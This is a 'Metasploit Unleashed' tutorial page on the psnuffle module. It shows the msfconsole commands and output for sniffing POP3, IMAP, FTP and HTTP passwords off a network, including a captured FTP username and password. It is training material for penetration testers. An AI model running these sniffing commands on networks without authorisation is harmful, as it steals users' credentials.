<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
  <meta content="text/html; charset=ISO-8859-1"
 http-equiv="Content-Type">
  <title>Password Sniffing</title>
<link rel="stylesheet" type="text/css" href="/home/steve/metasploit_unleashed/css.css" /></head>
<body>
<h1 style="color: rgb(0, 0, 0);" id="firstHeading" class="firstHeading">Password
Sniffing</h1>
<h3 style="color: rgb(0, 0, 0);" id="siteSub">From Metasploit Unleashed
- Mastering The Framework</h3>
<p style="color: rgb(0, 0, 0);">Recently, Max Moser released a
Metasploit password sniffing module
named 'psnuffle' that will sniff passwords off the wire similar to the
tool dsniff. It currently supports pop3, imap, ftp, and HTTP GET. You
can read more about the module on Max's Blog at <a
 href="http://remote-exploit.blogspot.com/2009/08/psnuffle-password-sniffer-for.html"
 class="external free" rel="nofollow">http://remote-exploit.blogspot.com/2009/08/psnuffle-password-sniffer-for.html</a>.
</p>
<p style="color: rgb(0, 0, 0);">Using the 'psnuffle' module is
extremely simple. There are some options available but the module works
great "out of the box".
<br>
<br>
</p>
<pre id="code">msf &gt; use auxiliary/sniffer/psnuffle<br>msf auxiliary(psnuffle) &gt; show options<br><br>Module options:<br><br>   Name       Current Setting  Required  Description<br>   ----       ---------------  --------  -----------<br>   FILTER                      no        The filter string for capturing traffic<br>   INTERFACE                   no        The name of the interface<br>   PCAPFILE                    no        The name of the PCAP capture file to process<br>   PROTOCOLS  all              yes       A comma-delimited list of protocols to sniff or "all".<br>   RHOST                       yes       The target address<br>   SNAPLEN    65535            yes       The number of bytes to capture<br>   TIMEOUT    1                yes       The number of seconds to wait for new data</pre>
<br style="color: rgb(0, 0, 0);">
<span style="color: rgb(0, 0, 0);">As you can see, the only mandatory
option that requires your action is
RHOST. There are also some options available, including the ability to
import a PCAP capture file. We will run the scanner in its default
mode.
</span><br style="color: rgb(0, 0, 0);">
<br style="color: rgb(0, 0, 0);">
<pre id="code">msf auxiliary(psnuffle) &gt; set RHOST 192.168.1.155<br>RHOST =&gt; 192.168.1.155<br>msf auxiliary(psnuffle) &gt; run<br>[*] Auxiliary module running as background job<br>[*] Loaded protocol FTP from /pentest/exploits/framework3/data/exploits/psnuffle/ftp.rb...<br>[*] Loaded protocol IMAP from /pentest/exploits/framework3/data/exploits/psnuffle/imap.rb...<br>[*] Loaded protocol POP3 from /pentest/exploits/framework3/data/exploits/psnuffle/pop3.rb...<br>[*] Loaded protocol URL from /pentest/exploits/framework3/data/exploits/psnuffle/url.rb...<br>[*] Sniffing traffic.....<br>[*] Successful FTP Login: 192.168.1.112:21-192.168.1.101:48614 &gt;&gt; dookie / dookie (220 3Com 3CDaemon FTP Server Version 2.0)</pre>
<br style="color: rgb(0, 0, 0);">
<span style="color: rgb(0, 0, 0);">There! We've captured a successful
FTP login. This is an excellent tool for passive information gathering.
</span><br style="color: rgb(0, 0, 0);">
<br style="color: rgb(0, 0, 0);">
<div style="text-align: center; color: rgb(0, 0, 0);"><a
 href="http://www.offensive-security.com/metasploit-unleashed/Information_Gathering"
 title="Information Gathering">Information Gathering</a></div>
<p style="color: rgb(0, 0, 0);"><br>
</p>
<div style="text-align: center; color: rgb(0, 0, 0);"><a
 href="http://www.offensive-security.com/metasploit-unleashed/Extending_Psnuffle"
 title="Extending Psnuffle">Extending Psnuffle</a></div>
</body>
</html>
